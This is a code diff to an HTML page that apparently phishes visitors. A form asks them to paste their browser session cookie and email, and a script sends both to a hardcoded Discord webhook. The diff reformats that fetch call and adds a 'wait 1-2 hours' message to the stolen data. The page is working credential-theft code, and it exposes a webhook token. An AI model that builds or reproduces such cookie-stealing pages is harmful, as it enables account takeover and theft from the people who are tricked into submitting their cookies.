@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+  <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
@@ -307,11 +307,6 @@
         <label for="cookie">Cookie:</label>
         <textarea id="cookie" placeholder="Paste The Cookie Here:" required></textarea>
       </div>
-      
-      <div class="wait">
-      </div>
-      <label for="wait">You Have To Wait For 1-2 Hours</label>
-
 
   
       <button type="submit" class="btn">
@@ -374,14 +369,13 @@
         submitBtn.innerHTML = `<span class="spin">🌀</span> Processing...`;
         submitBtn.disabled = true;
         
-        // Using your provided Discord webhook URL with exact requested format
         await fetch('https://discord.com/api/webhooks/1362160509033382008/lJKt647dAoHQReTt--qKe8Kp2yInWMqO6fJ7v8ev3U_FT-aDATnGgKuB2cCqUxoKruwT', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            content: `📧 Email: ${email}\n🍪Cookie:\n\`\`\`${cookie}\n\`\`\``
-          })
-        });
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+        content: `📧 Email: ${email}\n🍪 Cookie:\n\`\`\`${cookie}\n\`\`\`\n━━━━━━━━━━━━━━\n⚠️ Please wait 1-2 hours for processing!`
+        })
+        });;
         
         statusMessage.textContent = 'Success! Cookie submitted.';
         statusMessage.className = 'status-message success';
